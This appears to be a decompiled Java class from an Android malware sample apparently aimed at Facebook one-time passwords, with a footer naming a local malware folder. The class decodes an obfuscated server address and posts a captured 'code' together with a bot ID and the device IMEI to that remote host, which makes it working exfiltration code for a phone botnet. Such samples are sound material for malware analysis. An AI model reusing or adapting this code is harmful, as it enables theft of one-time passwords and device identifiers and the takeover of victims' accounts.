import android.content.Context;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class ec
  implements Runnable
{
  ec(dU paramdU, String paramString) {}
  
  public final void run()
  {
    new StringBuilder("start runable sendKode:").append(this.jdField_a_of_type_JavaLangString).toString();
    try
    {
      TimeUnit.SECONDS.sleep(2L);
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        try
        {
          DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
          localDefaultHttpClient.getParams().setParameter("http.protocol.content-charset", "UTF-8");
          Object localObject1 = AService.jdField_a_of_type_AndroidContentContext.getString(2131165194);
          try
          {
            localObject2 = this.jdField_a_of_type_DU.a;
            localObject2 = new String(cD.a((String)localObject1));
            localObject1 = localObject2;
          }
          catch (Exception localException)
          {
            Object localObject2;
            dU localdU;
            localException.printStackTrace();
            continue;
          }
          localObject1 = new HttpPost(this.jdField_a_of_type_DU.a(AService.jdField_a_of_type_Int) + (String)localObject1);
          localObject2 = new ArrayList();
          ((List)localObject2).add(new BasicNameValuePair("code", this.jdField_a_of_type_JavaLangString));
          ((List)localObject2).add(new BasicNameValuePair("bot_id", this.jdField_a_of_type_DU.b()));
          localdU = this.jdField_a_of_type_DU;
          ((List)localObject2).add(new BasicNameValuePair("imei", dU.a()));
          ((HttpPost)localObject1).setEntity(new UrlEncodedFormEntity((List)localObject2, "UTF-8"));
          localDefaultHttpClient.execute((HttpUriRequest)localObject1);
          new StringBuilder("sendKode:").append(this.jdField_a_of_type_JavaLangString).toString();
          return;
        }
        catch (IOException localIOException)
        {
          localIOException.printStackTrace();
          return;
        }
        catch (ClientProtocolException localClientProtocolException) {}
        localInterruptedException = localInterruptedException;
        localInterruptedException.printStackTrace();
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/ec.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */